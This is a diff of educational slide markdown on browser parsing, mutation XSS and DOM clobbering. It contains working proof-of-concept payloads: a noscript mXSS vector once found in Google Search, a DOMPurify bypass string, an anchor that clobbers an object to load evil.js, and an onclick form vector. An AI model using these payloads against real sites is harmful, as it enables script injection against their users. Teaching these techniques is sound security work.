@@ -28,19 +28,26 @@ outputs: ["Reveal"]
 ### how do browsers work
 they render html, css, and js into the DOM
 
-> you can think of them kinda like an intepreter (or a couple of interpreters)
+* you can think of them kinda like an interpreters
+* or a couple of interpreters (js + html parser)
+
+> read more [here](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction)
 
 ---
 
 ### syntax errors
 what happens when a brower receives invalidly formatted content (js, html, css)?
 
+```
+<di ><v></a>
+```
+
 > have you even seen a html syntax error
 
 ---
 
 ### javascript
-it throws an error (v8/spidermonkey)
+it throws an error which stops execution
 
 ```html
 <script>this isn't valid code</script>
@@ -59,6 +66,8 @@ it gives an error, but still renders the page
 <p>bottom text</p>
 ```
 
+> how does it do that?
+
 ---
 
 ### even worse code
@@ -73,6 +82,8 @@ is it different to this?
 ```html
 <script><div id="</script>">
 ```
+
+> why?
 
 ---
 
@@ -104,6 +115,8 @@ mutation xss abuses these browser "mutations" to bypass filters and sanitizers
 * you submit with a seemingly benign payload
 * the sanitizer/filter will recognise it as "benign"
 * when the browser parses it, it gets mutated into something malicious
+
+> a good paper [here](https://cure53.de/fp170.pdf)
 
 ---
 
@@ -165,7 +178,7 @@ DOMPurify.sanitize('<math><mtext><table><mglyph><style><!--</style><img title="-
 ---
 
 ### another example
-mxss in google search (2019)
+[mxss in google search](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/) (2019)
 
 ```html
 <noscript><p title="</noscript><img src=x onerror=alert(1)>">
@@ -199,10 +212,6 @@ div.children[0]
 
 ---
 
-### resources
-
-* [mxss in google search](https://www.acunetix.com/blog/web-security-zone/mutation-xss-in-google-search/)
-* [mutation xss paper](https://cure53.de/fp170.pdf)
 * [more dompurify bypass w/ mxss](https://portswigger.net/research/bypassing-dompurify-again-with-mutation-xss)
 
 {{% /section %}}
@@ -229,28 +238,34 @@ if you have an element with some id, it'll be added as an attribute of it's pare
 </script>
 ```
 
-> this is also the case for child elements (read more [here](https://developer.mozilla.org/en-US/docs/Web/API/Document_Object_Model/Introduction))
+> this is also the case for child elements 
 
 ---
 
 ### why is this important
 well the "clobbering" aspect
 
-* what if there's already a "blah" attribute you're trying to access?
-* what if there are two elements with the id "blah"?
-* which one is grabbed?
+* what if
+
+    * a "blah" attribute already existed?
+
+    * there are two elements with the id "blah"?
+
+* which one is used/prioritized?
 
 ---
 
 ### an example
 ```js
-window.onload = function(){
+window.onload = () => {
     let someObject = window.someObject || {};
     let script = document.createElement('script');
     script.src = someObject.url;
     document.body.appendChild(script);
 };
 ```
+
+&nbsp;
 
 ```html
 <a id=someObject name=url href=abc/evil.js>
@@ -264,6 +279,8 @@ a sanitizer might try to iterate through the "attributes" of the form element.
 ```html
 <form onclick=alert(1)><input id=attributes>Click me
 ```
+
+> blah blah
 
 ---
 
@@ -283,6 +300,11 @@ a sanitizer might try to iterate through the "attributes" of the form element.
 
 {{% section %}}
 
-### extra: js stuff
+### client-side exploitation
+you control what happens in your browser
+
+* has anyone ever deleted/edited elements in the dom?
+* there's more that you can do with this
+* you can modify any content that you receive in your browser, including javascript
 
 {{% /section %}}
